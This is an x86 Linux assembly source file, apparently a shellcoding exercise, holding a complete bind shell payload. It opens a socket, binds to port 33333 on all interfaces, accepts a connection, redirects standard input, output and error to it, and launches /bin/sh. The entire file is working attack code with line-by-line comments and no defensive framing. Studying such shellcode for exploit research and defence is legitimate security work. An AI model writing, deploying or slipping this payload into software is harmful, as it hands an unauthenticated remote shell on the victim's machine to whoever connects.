global _start           

section .text

_start:
    xor ebx, ebx    ; zero out ebx
    mul ebx         ; zero out eax, edx

    ;  socket(AF_INET, SOCK_STREAM, 0);
    mov al, 102     ; socketcall()
    mov bl, 1       ; socket()
    push edx        ; protocol
    push ebx        ; SOCK_STREAM
    push 2          ; AF_INET
    mov ecx, esp    ; load address of the parameter array
    int 0x80        ; call socketcall()

    ; eax contains the newly created socket
    mov esi, eax

    ; bind(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    mov al, 102     ; socketcall()
    inc ebx         ; bind() - 2
    push edx          ; INADDR_ANY
    push word 0x3582 ; port
    push word bx     ; AF_INET
    mov ecx, esp    ; point to the structure
    push 16         ; sizeof(struct sockaddr_in)
    push ecx        ; &serv_addr
    push esi        ; sockfd
    mov ecx, esp    ; load address of the parameter array
    int 0x80        ; call socketcall()

    ; listen(sockfd, backlog);
    mov al, 102     ; socketcall()
    mov bl, 4       ; listen()
    push edx        ; backlog
    push esi        ; sockfd
    mov ecx, esp    ; load address of the parameter array
    int 0x80        ; call socketcall()

    ; accept(sockfd, (struct sockaddr *)&cli_addr, &sin_size);
    mov al, 102     ; socketcall()
    mov bl, 5       ; accept()
    push edx          ; zero addrlen
    push edx          ; null sockaddr
    push esi        ; sockfd
    mov ecx, esp    ; load address of the parameter array
    int 0x80        ; call socketcall()

    ; eax contains the descriptor for the accepted socket
    xchg ebx, eax

    xor ecx, ecx    ; zero out ecx
    mov cl, 2       ; initialize counter

    loop:
        ; dup2(connfd, 0);
        mov al, 63  ; dup2()
        int 0x80
        dec ecx
        jns loop

    ; execve(“/bin/sh”, [“/bin/sh”, NULL], NULL);
    xchg eax, edx
    push eax        ; push null bytes (terminate string)
    push 0x68732f2f ; //sh
    push 0x6e69622f ; /bin
    mov ebx, esp    ; load address of /bin/sh
    push eax        ; null terminator
    push ebx        ; push address of /bin/sh 
    mov ecx, esp    ; load array address 
    push eax        ; push null terminator
    mov edx, esp    ; empty envp array
    mov al, 11      ; execve()
    int 0x80        ; call execve()